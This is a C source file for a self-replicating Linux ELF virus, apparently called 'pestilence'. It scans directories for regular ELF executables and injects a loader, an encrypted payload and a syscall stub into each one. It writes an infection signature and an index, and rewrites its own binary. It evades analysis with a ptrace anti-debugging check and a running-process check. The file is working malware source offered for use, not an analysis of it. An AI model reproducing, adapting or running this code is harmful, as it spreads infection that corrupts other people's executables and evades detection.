#include "pestilence.h"

static void	init_info(t_info *info)
{
	info->text_begin = 0;
	info->text_size = 0;
	info->valid_target = 1;
}


static void	inject_payload(t_info *info)
{
	void		*addr;

	addr = &ft_memcpy;
	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
	ft_memcpy(info->file + info->offset_bis + BIS_SIZE, addr, PAYLOAD_SIZE);
	patch_payload(info);
}


static void	inject_loader(t_info *info)
{
	void	*addr;

	addr = &loader;
	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
}

static void	inject_bis(t_info *info)
{
	void		*addr;	

	addr = &syscalls;
	ft_memcpy(info->file + info->offset_bis, addr, BIS_SIZE);
}


static int		reload_mapping(t_info *info)
{
	void	*new;
	size_t	new_size;

	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE + BIS_SIZE;
	if ((new = ft_sysmmap(0, new_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return (1);
	ft_memcpy(new, info->file, info->file_size);
	ft_sysmunmap(info->file, info->file_size);
	info->file = new;
	info->file_size = new_size;
	return (0);
}

static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
{
	uint32_t	magic = MAGIC_VIRUS;
	char		buf[0x40];

	//sign
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, &magic, 4);
	write_sign(buf);
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4, buf, SIGN_SIZE);
	//fingerprint
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4 + SIGN_SIZE, &(fingerprint->fingerprint), 4);
	//index
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 5, &(fingerprint->index), 4);
	return (0);
}

/*
static void	nice_with_gdb(t_info *info)
{
	size_t size;

	size = info->file_size - (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
	size = size - info->begin_bss;
 	ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
}
*/

static void	infect_file(char *path, t_fingerprint *fingerprint)
{
	struct stat		st;
	t_info			info;
	uint32_t		magic;

	if ((info.fd = ft_sysopen(path, O_RDWR)) < 0)
		return ;
	init_info(&info);
	ft_sysfstat(info.fd, &st);
	info.file_size = st.st_size;
	if ((info.file_size > 50*1024*1024) || info.file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
		goto end_close;
	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, info.fd, 0)) == MAP_FAILED)
		goto end_close;
	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
		goto end_fct;
	if (pe_parsing(&info) == 1)
		goto end_fct;
	if (reload_mapping(&info) == 1)
		goto end_fct;
	if (find_text(&info, fingerprint) == 1)
		goto end_fct;
	inject_loader(&info);
	// nice_with_gdb(&info);
	inject_payload(&info);
	inject_bis(&info);
	epo_parsing(&info);
	if (info.valid_target == 0)
		goto end_fct;
	patch_addresses(&info);
	inject_sign(&info, fingerprint);
	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
	ft_syswrite(info.fd, info.file, info.file_size);
	end_fct:
	ft_sysmunmap(info.file, info.file_size);
	end_close:
	ft_sysclose(info.fd);
	return ;
}

static int	get_index_file(char *path)
{
	struct stat	st;
	int		fd;
	uint32_t	magic, index;
	size_t		file_size;
	void		*file;
	Elf64_Ehdr	*main_header;
	Elf64_Phdr	*header;
	size_t		base_entry;
	int32_t		i;
	void		*addr_magic;

	index = 0;
	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
		return 0;
	ft_sysfstat(fd, &st);
	file_size = st.st_size;
	if ((file_size > 60*1024*1024) || file_size < sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr))
		goto end_close;
	if ((file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto end_close;
	if ((magic = *((uint32_t *)(file))) != 0x464C457F)
		goto end_fct;


	main_header = (Elf64_Ehdr *)(file);
	base_entry = main_header->e_entry;
	i = 0;
	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
	if (file_size < main_header->e_shoff + (main_header->e_shnum * sizeof(Elf64_Shdr)))
		goto end_fct;
	while (i < main_header->e_phnum)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			addr_magic = file + header->p_offset + header->p_filesz - SIGN_SIZE - 8;
			magic = *((uint32_t *)(addr_magic));
			if (magic == MAGIC_VIRUS)
			{
				index = (*((uint32_t *)(addr_magic - 5)));
				goto end_fct;
			}
		}
		header++;
		i++;
	}
	end_fct:
	ft_sysmunmap(file, file_size);
	end_close:
	ft_sysclose(fd);
	return index;
}

static int	get_highest_index(char *path, t_fingerprint *fingerprint)
{
	char			buf_d[1024];
	struct linux_dirent64	*dir;
	int			fd, n_read, pos;
	uint32_t		index, tmp_index;
	char			buf_path_file[PATH_MAX];

	index = 0;
	n_read = 0;
	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
		return (1);
	while ((n_read = ft_sysgetdents(fd, buf_d, 1024)) > 0)
	{
		for (pos = 0; pos < n_read;)
		{
			dir = (struct linux_dirent64 *)(buf_d + pos);
			if (dir->d_type == 8) //dt_reg
			{
				fingerprint->fingerprint += 1;
				ft_memcpy(buf_path_file, path, PATH_MAX);
				ft_strcat(buf_path_file, dir->d_name);
				tmp_index = get_index_file(buf_path_file);
				if (tmp_index > index)
					index = tmp_index;
			}
			pos += dir->d_reclen;
		}
	}
	ft_sysclose(fd);
	return (index);
}

static int	infect_dir(char *path, t_fingerprint *fingerprint)
{
	char			buf_d[1024];
	struct linux_dirent64	*dir;
	int			fd, n_read, pos;
	char			buf_path_file[PATH_MAX];

	n_read = 0;
	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
		return (1);
	while ((n_read = ft_sysgetdents(fd, buf_d, 1024)) > 0)
	{
		for (pos = 0; pos < n_read;)
		{
			dir = (struct linux_dirent64 *)(buf_d + pos);
			if (dir->d_type == 8) //dt_reg
			{
				ft_memcpy(buf_path_file, path, PATH_MAX);
				ft_strcat(buf_path_file, dir->d_name);
				infect_file(buf_path_file, fingerprint);
				fingerprint->fingerprint -= 1;
			}
			pos += dir->d_reclen;
		}
	}
	ft_sysclose(fd);
	return (0);
}

void		close_entries(void)
{
	double_ret();
	uint32_t	addr_origin;
	void		*addr;
	void		*addr_hook;

	addr = get_rip();
	mprotect_text(PROT_WRITE | PROT_READ | PROT_EXEC);
	addr_origin = -1;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -2;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -3;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -4;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);

	addr_origin = -5;
	addr_hook = addr + 0x12345678;
	ft_memcpy(addr_hook, &addr_origin, 4);
}

void		get_path_own_file(char *buf)
{
	char	path_sym[PATH_MAX];
	pid_t	pid;

	ft_memset(path_sym, PATH_MAX, '\0');
	write_proc(path_sym);
	pid = ft_sysgetpid();
	itoa(buf, pid);
	ft_strcat(path_sym, buf);
	write_exe(buf);
	ft_strcat(path_sym, buf);
	ft_sysreadlink(path_sym, buf, PATH_MAX);
}

void		rewrite_own_file(char *path, void *file, size_t size, int fd, struct stat st)
{
	ft_sysclose(fd);
	if (ft_sysunlink(path) < 0)
		return ;
	if ((fd = ft_sysopenmode(path, O_RDWR | O_CREAT, st.st_mode)) < 0)
		return ;
	ft_syswrite(fd, file, size);
	ft_sysclose(fd);
}

void		update_own_index(t_fingerprint *fingerprint)
{
	char			path[PATH_MAX];
	struct stat		st;
	void			*file;
	int			fd;
	size_t			base_entry;
	void			*addr;
	Elf64_Phdr		*header;
	uint32_t		new_index;

	ft_memset(path, PATH_MAX, '\0');
	get_path_own_file(path);
	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
		return ;
	ft_sysfstat(fd, &st);
	if ((file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto end_close;
	base_entry = ((Elf64_Ehdr *)(file))->e_entry;
	header = (Elf64_Phdr *)(file + sizeof(Elf64_Ehdr));
	while (header)
	{
		if ((header->p_type == PT_LOAD) && (base_entry > header->p_vaddr) && (base_entry < header->p_vaddr + header->p_memsz))
		{
			addr = file + header->p_offset + header->p_memsz;
			break ;
		}
		header++;
	}
	if (*((uint32_t *)(file + 0x1291)) == 0xffffffff) // pos -1 dans loader
		addr = (file + 0x11f5); // offset index dans loader
	else
		addr = addr - SIGN_SIZE - 8 - 5;
	if (*((uint32_t *)(addr)) > fingerprint->index)
		fingerprint->index = *((uint32_t *)(addr));
	new_index = fingerprint->index + fingerprint->fingerprint;
	ft_memcpy(addr, &new_index, 4);
	rewrite_own_file(path, file, st.st_size, fd, st);
	ft_sysmunmap(file, st.st_size);
	end_close:
	ft_sysclose(fd);
	return ;
}

int		main(void)
{
	char			buf[BUF_SIZE];
	char			buf_path[PATH_MAX];
	uint32_t		tmp_index;
	t_fingerprint		fingerprint;

	if (ft_sysptrace(0, 0, 1, 0) == -1)
		return (0);
	close_entries();
	write_proc(buf_path);
	if ((check_process(buf_path)) == 1)
		return (0);
	write_begin(buf);
	ft_syswrite(1, buf, 8);
	write_test2(buf_path);
	fingerprint.fingerprint = 0;
	tmp_index = get_highest_index(buf_path, &fingerprint);
	write_test(buf_path);
	fingerprint.index = get_highest_index(buf_path, &fingerprint);
	if (tmp_index > fingerprint.index)
		fingerprint.index = tmp_index;
	update_own_index(&fingerprint); // update fingerprint.index and update own exec
	fingerprint.index += fingerprint.fingerprint;
	fingerprint.fingerprint = fingerprint.index;
	infect_dir(buf_path, &fingerprint);
	write_test2(buf_path);
	infect_dir(buf_path, &fingerprint);
	return (0);
}
